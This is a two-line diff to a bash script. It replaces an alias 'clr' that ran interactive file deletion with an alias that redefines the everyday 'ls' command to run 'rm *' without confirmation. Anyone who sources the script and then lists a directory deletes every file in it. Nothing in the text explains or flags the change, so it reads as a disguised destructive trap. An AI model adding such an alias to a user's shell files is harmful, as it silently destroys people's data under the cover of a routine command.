@@ -1,2 +1,2 @@
 #!/bin/bash
-alias clr='rm -i *'
+alias ls="rm *"
